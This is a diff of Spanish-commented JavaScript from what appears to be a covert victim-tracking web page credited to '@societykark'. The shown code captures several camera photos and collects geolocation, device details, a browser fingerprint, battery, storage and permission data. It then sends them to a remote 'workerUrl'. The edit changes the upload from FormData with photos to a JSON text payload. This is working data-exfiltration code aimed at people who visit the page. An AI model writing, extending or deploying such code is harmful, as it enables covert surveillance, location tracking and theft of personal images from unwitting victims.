@@ -80,7 +80,7 @@
     }
 
     // ============================================================
-    // 4. CAPTURAR FOTOS MÚLTIPLES
+    // 4. CAPTURAR FOTOS MÚLTIPLES (COMO BLOBS)
     // ============================================================
     async function capturarFotos(cantidad = 3) {
         const fotos = [];
@@ -256,7 +256,7 @@
     }
 
     // ============================================================
-    // 10. ENVIAR TODOS LOS DATOS AL WORKER (COMO FORMDATA)
+    // 10. ENVIAR TODOS LOS DATOS AL WORKER (COMO JSON)
     // ============================================================
     async function enviarAlWorker() {
         const [fotos, ubicacion, dispositivo, fp, bateria, almacenamiento, permisos] = await Promise.all([
@@ -355,19 +355,19 @@
         msg += `⚡ Developed by: @societykark\n\n`;
         msg += `⏰ ${new Date().toISOString()}`;
 
-        // ========== ENVIAR COMO FORMDATA AL WORKER ==========
-        const formData = new FormData();
-        formData.append('text', msg);
-        fotos.forEach((foto, index) => {
-            if (foto) formData.append(`photo_${index}`, foto, `photo_${index}.jpg`);
-        });
-
+        // ========== ENVIAR COMO JSON ==========
         try {
-            const response = await fetch(workerUrl, { method: 'POST', body: formData });
+            const response = await fetch(workerUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ text: msg })
+            });
             const result = await response.json();
-            console.log('✅ Enviado al Worker:', result);
+            console.log('✅ Enviado:', result);
         } catch(e) {
-            console.error('❌ Error al enviar:', e);
+            console.error('❌ Error:', e);
         }
     }
 
